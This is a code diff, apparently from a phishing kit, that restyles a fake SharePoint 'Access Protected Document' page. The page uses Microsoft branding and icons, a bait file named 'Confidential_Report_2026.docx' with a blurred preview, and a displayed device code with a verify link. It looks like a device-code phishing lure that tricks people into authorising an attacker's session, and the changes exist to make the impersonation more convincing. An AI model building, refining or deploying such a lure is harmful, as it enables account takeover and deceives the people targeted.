@@ -3242,6 +3242,7 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
             --sp-card: #ffffff;
             --sp-text-main: #201f1e;
             --sp-text-muted: #605e5c;
+            --sp-border: #edebe9;
         }
 
         body, html {
@@ -3251,16 +3252,19 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
             font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
             background-color: var(--sp-bg);
             color: var(--sp-text-main);
+            -webkit-font-smoothing: antialiased;
         }
 
         .suite-bar {
-            background-color: #2b2b2b;
+            background-color: #0078d4;
             height: 48px;
             display: flex;
             align-items: center;
-            padding: 0 20px;
+            padding: 0 16px;
             color: white;
-            font-size: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            box-shadow: 0 1px 2px 0 rgba(0,0,0,0.1);
         }
 
         .main-container {
@@ -3269,58 +3273,100 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
             align-items: center;
             min-height: calc(100vh - 48px);
             padding: 20px;
+            box-sizing: border-box;
         }
 
         .auth-card {
             background: var(--sp-card);
             width: 100%;
-            max-width: 440px;
-            border-radius: 8px;
-            box-shadow: 0 1.6px 3.6px rgba(0,0,0,0.13), 0 0.3px 0.9px rgba(0,0,0,0.11);
-            padding: 40px;
-            text-align: center;
+            max-width: 420px;
+            border-radius: 4px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.1);
+            padding: 32px;
+            box-sizing: border-box;
         }
 
-        .logo-area { margin-bottom: 24px; }
-        .logo-area img { width: 48px; height: 48px; }
+        .logo-area { margin-bottom: 20px; text-align: center; }
+        .logo-area img { width: 42px; height: 42px; }
 
-        h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
-        p { color: var(--sp-text-muted); font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
+        h1 { font-size: 20px; font-weight: 600; margin: 0 0 8px 0; color: #201f1e; text-align: center; }
+        p.instruction { color: var(--sp-text-muted); font-size: 14px; margin: 0 0 24px 0; line-height: 1.4; text-align: center; }
 
-        .document-preview {
-            background: #faf9f8;
-            border: 1px solid #edebe9;
-            border-radius: 4px;
-            padding: 20px;
+        /* Enhanced File/Document Container */
+        .file-container {
+            border: 1px solid var(--sp-border);
+            border-radius: 6px;
+            background: #ffffff;
             margin-bottom: 24px;
-            position: relative;
             overflow: hidden;
             text-align: left;
         }
 
+        .file-header {
+            display: flex;
+            align-items: center;
+            padding: 12px 16px;
+            background: #faf9f8;
+            border-bottom: 1px solid var(--sp-border);
+        }
+
+        .file-icon {
+            width: 32px;
+            height: 32px;
+            margin-right: 12px;
+            flex-shrink: 0;
+        }
+
+        .file-info {
+            overflow: hidden;
+            white-space: nowrap;
+            text-overflow: ellipsis;
+        }
+
+        .file-name {
+            font-size: 14px;
+            font-weight: 600;
+            color: #201f1e;
+            margin-bottom: 2px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .file-meta {
+            font-size: 11px;
+            color: var(--sp-text-muted);
+        }
+
+        .document-preview {
+            background: #ffffff;
+            padding: 24px;
+            position: relative;
+        }
+
         .blurred-text {
-            filter: blur(4px);
+            filter: blur(5px);
             user-select: none;
-            opacity: 0.6;
+            opacity: 0.4;
         }
 
         .blurred-text div {
-            height: 10px;
-            background: #d2d2d2;
-            margin-bottom: 8px;
-            border-radius: 2px;
+            height: 8px;
+            background: #a19f9d;
+            margin-bottom: 12px;
+            border-radius: 4px;
         }
 
         .code-input-display {
             font-size: 28px;
             font-weight: 700;
             color: var(--sp-primary);
-            letter-spacing: 8px;
+            letter-spacing: 6px;
             margin: 16px 0;
-            padding: 12px;
-            background: #f8f8f8;
+            padding: 14px;
+            background: #f3f2f1;
             border-radius: 4px;
             border: 1px solid #e1dfdd;
+            text-align: center;
         }
 
         .btn-primary {
@@ -3328,19 +3374,20 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
             color: white;
             border: none;
             padding: 10px 20px;
-            border-radius: 2px;
+            border-radius: 4px;
             font-size: 14px;
             font-weight: 600;
             cursor: pointer;
             width: 100%;
             margin-top: 10px;
+            transition: background-color 0.1s ease;
         }
 
         .btn-primary:hover { background-color: #106ebe; }
-        .btn-primary:disabled { background-color: #c8c6c4; cursor: not-allowed; }
+        .btn-primary:disabled { background-color: #c8c6c4; cursor: not-allowed; color: #a19f9d; }
 
-        .timer { font-size: 12px; color: var(--sp-text-muted); margin-top: 16px; }
-        .status-msg { font-size: 13px; min-height: 22px; font-weight: 500; margin: 6px 0 4px; color: #107c10; }
+        .timer { font-size: 12px; color: var(--sp-text-muted); margin-top: 16px; text-align: center; }
+        .status-msg { font-size: 13px; min-height: 22px; font-weight: 500; margin: 6px 0 4px; color: #107c10; text-align: center; }
         
         .success-view {
             display: none;
@@ -3358,8 +3405,8 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
             font-size: 28px;
             margin-bottom: 16px;
         }
-        .success-view h2 { font-weight: 600; margin-bottom: 4px; }
-        .success-view p { color: var(--sp-text-muted); margin-bottom: 12px; }
+        .success-view h2 { font-weight: 600; margin-bottom: 4px; font-size: 20px; }
+        .success-view p { color: var(--sp-text-muted); margin-bottom: 12px; font-size: 14px; }
         .success-badge {
             background: #dff6dd;
             color: #107c10;
@@ -3374,7 +3421,7 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
 <body>
 
     <div class="suite-bar">
-        <span>Microsoft 365</span>
+        <span>SharePoint</span>
     </div>
 
     <div class="main-container">
@@ -3384,15 +3431,26 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
                     <img src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/SharePoint-Icon-FY26.svg" alt="SharePoint">
                 </div>
                 
-                <h1>Secure Document Access</h1>
-                <p>To view this protected document, please complete the device authentication process.</p>
+                <h1>Access Protected Document</h1>
+                <p class="instruction">To view this corporate asset, please confirm your identity using device authentication.</p>
 
-                <div class="document-preview">
-                    <div class="blurred-text">
-                        <div style="width: 80%;"></div>
-                        <div style="width: 100%;"></div>
-                        <div style="width: 90%;"></div>
-                        <div style="width: 60%;"></div>
+                <!-- New Document File View -->
+                <div class="file-container">
+                    <div class="file-header">
+                        <!-- Standard Microsoft Word Icon for styling -->
+                        <img class="file-icon" src="https://res-1.cdn.office.net/files/fabric-cdn-prod_20240129.001/assets/item-types/32/docx.svg" alt="Document">
+                        <div class="file-info">
+                            <div class="file-name">Confidential_Report_2026.docx</div>
+                            <div class="file-meta">SharePoint Online &bull; Protected File</div>
+                        </div>
+                    </div>
+                    <div class="document-preview">
+                        <div class="blurred-text">
+                            <div style="width: 85%;"></div>
+                            <div style="width: 95%;"></div>
+                            <div style="width: 40%;"></div>
+                            <div style="width: 70%;"></div>
+                        </div>
                     </div>
                 </div>
 
@@ -3434,7 +3492,7 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
                 code = c;
                 if (v) verifyUrl = v;
                 codeEl.textContent = c;
-                codeEl.style.letterSpacing = '8px';
+                codeEl.style.letterSpacing = '6px';
                 codeEl.style.color = '#0078d4';
                 btnEl.disabled = false;
             }
